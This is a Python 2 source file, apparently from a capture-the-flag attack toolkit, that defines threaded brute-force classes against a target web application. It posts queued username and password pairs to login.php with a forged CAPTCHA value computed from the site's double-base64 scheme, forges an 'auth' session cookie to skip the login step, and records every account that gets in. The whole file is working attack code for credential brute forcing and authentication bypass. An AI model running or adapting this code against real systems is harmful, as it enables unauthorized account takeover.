import Queue
import base64
import cookielib
import random
import threading
import time
import urllib
import urllib2
from config import TARGET_HOST, LOGGER
from misc import generate_cookie, add_good
from my_queues import account_password_queue, known_users, ENEMY

__author__ = 'gifts'

class Base_Bruter(threading.Thread):
    def __init__(self):
        super(Base_Bruter, self).__init__()

    def generate_opener(self):
        self.cookiejar = cookielib.CookieJar()
        self.opener = urllib2.build_opener(
            urllib2.HTTPCookieProcessor(self.cookiejar),
        )

    def generate_captcha(self, value):
        return base64.b64encode(base64.b64encode(str(value))[::-1])

    def brute_login(self, user, password):
        rand_captcha = str(random.randint(10000, 99999))
        req = urllib2.Request(
            'http://{0}/login.php'.format(TARGET_HOST),
            urllib.urlencode(
                    {
                    'login': str(user).strip(),
                    'password': str(password).strip(),
                    'code': rand_captcha,
                    '_code': self.generate_captcha(rand_captcha)
                }
            )
            # TODO: possible headers error
        )
        data = self.open(req)
        return data

    def brute_login_with_session(self, user, password):
        self.cookiejar.set_cookie(
            generate_cookie(
                'auth',
                '{0}|{1}|{2}'.format(
                    user,
                    '2',
                    str(int(password) % 10000).ljust(4, '1')
                )
            )
        )
        req = urllib2.Request(
            'http://{0}/index.php'.format(TARGET_HOST)
            # TODO: possible headers error
        )
        data = self.open(req)
        return data

    def check(self, data):
        return 'Transactions' in data

    def open(self, request):
        try:
            result = self.opener.open(request)
        except urllib2.HTTPError as e:
            result = e
        data = result.read()
        return data


class Bruter(Base_Bruter):
    def run(self):
        LOGGER.info('Run brute')
        while 1:
            try:
                user, password = account_password_queue.get(block=1, timeout=10)
            except Queue.Empty:
                continue
            if user in known_users:
                continue
            self.generate_opener()
            data = self.brute_login(user, password)
            account_password_queue.task_done()
            time.sleep(0.01)
            if self.check(data):
                add_good(user, password, data, self.opener)


class Bruter_Enemy(Base_Bruter):
    def run(self):
        LOGGER.info('Run brute')
        while 1:
            try:
                user, password = ENEMY.get(block=1, timeout=10)
            except Queue.Empty:
                continue
            if user in known_users:
                continue
            self.generate_opener()
            data = self.brute_login_with_session(user, password)
            account_password_queue.task_done()
            if self.check(data):
                add_good(user, password, data, self.opener)

